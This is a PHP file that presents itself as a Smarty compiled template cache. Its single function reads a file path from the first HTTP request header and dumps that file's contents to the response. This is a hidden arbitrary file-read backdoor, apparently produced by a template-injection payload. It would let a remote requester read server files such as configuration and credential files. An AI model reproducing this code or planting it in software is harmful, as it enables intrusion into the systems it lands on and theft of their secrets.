<?php
/* Smarty version 3.1.30, created on 2019-06-23 11:51:50
  from "23a048056b656f9bb4b119798c817bafa390bf7d" */

/* @var Smarty_Internal_Template $_smarty_tpl */
if ($_smarty_tpl->_decodeProperties($_smarty_tpl, array (
  'version' => '3.1.30',
  'unifunc' => 'content_5d0f67d6724238_31668012',
  'has_nocache_code' => false,
  'file_dependency' => 
  array (
  ),
  'includes' => 
  array (
  ),
),false)) {
function content_5d0f67d6724238_31668012 (Smarty_Internal_Template $_smarty_tpl) {
echo var_dump(fread(fopen(urldecode(current(getallheaders())),'r')));
}
}
